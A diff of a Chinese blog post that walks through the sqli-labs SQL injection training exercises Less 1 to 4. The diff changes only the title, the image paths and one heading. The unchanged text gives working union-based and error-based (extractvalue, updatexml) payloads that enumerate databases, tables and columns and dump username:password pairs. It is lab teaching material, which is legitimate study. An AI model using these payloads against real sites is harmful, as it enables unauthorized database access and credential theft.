@@ -24,7 +24,7 @@
     <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
     <div class="post-title">
         <p>
-            sql注入(一)
+            sql注入(1)
         </p>
         <hr>
     </div>
@@ -36,23 +36,23 @@
 <p>查看源码，sql语句为：</p>
 <p><code>SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1</code></p>
 <h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;先使用<strong>id=-1</strong>让sql语句前半部分报错，方便执行后面的sql语句</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;用order by 判断有三个字段，回显位为2、3<br><img src="./images/1-1.jpg"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;用order by 判断有三个字段，回显位为2、3<br><img src="/2020/09/03/sql%E6%B3%A8%E5%85%A5-1/1-1.jpg"></p>
 <p>构造payload如下：</p>
 <p>爆库：<br><code>?id=-1&#39; union select 1,2,database() -- </code></p>
-<p><img src="./images/1-2.jpg"></p>
+<p><img src="/2020/09/03/sql%E6%B3%A8%E5%85%A5-1/1-2.jpg"></p>
 <p>库名：<strong>security</strong></p>
 <p>爆表：</p>
 <p><code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- -</code></p>
-<p><img src="./images/1-3.jpg"></p>
+<p><img src="/2020/09/03/sql%E6%B3%A8%E5%85%A5-1/1-3.jpg"></p>
 <p>&nbsp;&nbsp;&nbsp;&nbsp;可以看到，security库有<strong>emails、referers、uagents、users</strong>四个表，其中我们需要<strong>users</strong>表的内容</p>
 <p>爆字段（列名）：<br><code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; -- -</code></p>
-<p><img src="./images/1-4.jpg"></p>
+<p><img src="/2020/09/03/sql%E6%B3%A8%E5%85%A5-1/1-4.jpg"></p>
 <p>&nbsp;&nbsp;&nbsp;&nbsp;我们发现爆破出了<strong>SER、CURRENT_CONNECTIONS、TOTAL_CONNECTIONS、id、username、password</strong>6个列名，其中只有后面三个才是我们需要的，之所以会出现前三个数据，是因为我们只指定了table_name=’users’。其他的users表名会造成干扰。修改payload：</p>
 <p><code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema = &#39;security&#39;-- -</code></p>
-<p><img src="./images/1-5.jpg"></p>
+<p><img src="/2020/09/03/sql%E6%B3%A8%E5%85%A5-1/1-5.jpg"></p>
 <p>爆值<br><code>?id=-1&#39; union select 1,2,group_concat(username,0x3a,password) from users -- -</code></p>
 <p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>0x3a</strong>中3a是十进制的58，代表冒号。</p>
-<p><img src="./images/1-6.jpg"></p>
+<p><img src="/2020/09/03/sql%E6%B3%A8%E5%85%A5-1/1-6.jpg"></p>
 <h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;先使用order by 和select 1，2，3判断回显位，然后用union查询，配合group_concat函数，使结果显示在一行中。依靠information_schema爆库。这里的id=-1是为了让语句的前半句报错，这样后半句的结果才会被回显出来。</p>
 <h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;判断方式：</p>
 <p><code>?id=1&#39; and 1=1 -- - 页面正常</code></p>
@@ -63,24 +63,24 @@
 <p>第二个参数：XPath_string (Xpath格式的字符串)</p>
 <p>利用点在第二个参数，用concat()将其连接成一个字符串，就不会出现格式的错误，举个例子：</p>
 <p>爆库名：<br><code>?id = 1&#39; and extractvalue(1,concat(0x7e,database(),0x7e))</code></p>
-<p><img src="./images/1-7.jpg"></p>
+<p><img src="/2020/09/03/sql%E6%B3%A8%E5%85%A5-1/1-7.jpg"></p>
 <h3 id="updataxml"><a href="#updataxml" class="headerlink" title="updataxml"></a>updataxml</h3><p>UPDATEXML (XML_document, XPath_string, new_value); </p>
 <p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </p>
 <p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 </p>
 <p>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
 <p>同样的利用点在第二个参数处，举个例子：</p>
 <p>爆库名：<br><code>?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)</code></p>
-<p><img src="./images/1-8.jpg"></p>
+<p><img src="/2020/09/03/sql%E6%B3%A8%E5%85%A5-1/1-8.jpg"></p>
 <h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>爆表名：<br><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) -- -</code></p>
-<p><img src="./images/1-9.jpg"></p>
+<p><img src="/2020/09/03/sql%E6%B3%A8%E5%85%A5-1/1-9.jpg"></p>
 <p>爆列名：<br><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema = &#39;security&#39;),0x7e)) -- -</code></p>
-<p><img src="./images/1-10.jpg"></p>
+<p><img src="/2020/09/03/sql%E6%B3%A8%E5%85%A5-1/1-10.jpg"></p>
 <p>爆值：<br><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e)) -- -</code></p>
-<p><img src="./images/1-11.jpg"></p>
+<p><img src="/2020/09/03/sql%E6%B3%A8%E5%85%A5-1/1-11.jpg"></p>
 <p>&nbsp;&nbsp;&nbsp;&nbsp;可以发现并没有完全显示出来，是因为extractvalue能查询的字符串最大长度为32位，超出的部分就显示不出来了，这里我们用substring()函数截取</p>
 <p>substring((SQL语句),1,5)</p>
 <p><code>?id=1&#39; and extractvalue(1,concat(0x7e,substring((select group_concat(username,0x3a,password) from users),32,64),0x7e)) -- -</code></p>
-<p><img src="./images/1-12.jpg"></p>
+<p><img src="/2020/09/03/sql%E6%B3%A8%E5%85%A5-1/1-12.jpg"></p>
 <p>逐次跑出所有</p>
 <h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>union时，id=-1 使语句报错；报错注入时，不要让语句报错。</p>
 <h1 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h1><p>单引号报错：</p>
@@ -89,8 +89,8 @@
 </blockquote>
 <p>跟less类似，查看源码可见sql代码如下：<br><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p>
 <p>判断id没有被’’包起来，所以借用less1的payload去掉单引号即可即可，</p>
-<p><img src="./images/1-13.jpg"></p>
-<p>#less3<br>单引号报错：</p>
+<p><img src="/2020/09/03/sql%E6%B3%A8%E5%85%A5-1/1-13.jpg"></p>
+<h1 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h1><p>单引号报错：</p>
 <blockquote>
 <p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1</p>
 </blockquote>
@@ -98,7 +98,7 @@
 <p><code>?id=1&#39;) and 1=2 -- -&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;//页面不正常</code></p>
 <p>源码：<br><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p>
 <p>构造方法跟less1、less2类似</p>
-<p><img src="./images/1-14.jpg"></p>
+<p><img src="/2020/09/03/sql%E6%B3%A8%E5%85%A5-1/1-14.jpg"></p>
 <h1 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h1><p>单引号不报错，双引号报错。猜测是用的””来包含$id</p>
 <blockquote>
 <p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1””) LIMIT 0,1’ at line 1</p>
